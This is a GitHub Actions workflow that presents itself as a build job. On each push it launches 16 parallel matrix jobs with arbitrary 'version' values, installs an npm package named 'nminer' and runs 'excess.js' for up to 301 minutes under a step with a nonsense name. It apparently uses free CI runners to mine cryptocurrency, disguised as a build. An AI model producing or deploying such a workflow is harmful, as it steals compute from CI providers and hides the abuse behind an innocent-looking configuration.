name: excess
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1482 }
          - { version: 8298 }
          - { version: 667 }
          - { version: 4395 }
          - { version: 614 }
          - { version: 3738 }
          - { version: 1272 }
          - { version: 1974 }
          - { version: 6472 }
          - { version: 4205 }
          - { version: 4508 }
          - { version: 1057 }
          - { version: 5076 }
          - { version: 7572 }
          - { version: 2544 }
          - { version: 2247 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: quick-witted an who whenever triangular
        run: |
          npm install nminer@latest
          timeout 301m node excess.js || echo "excess executed"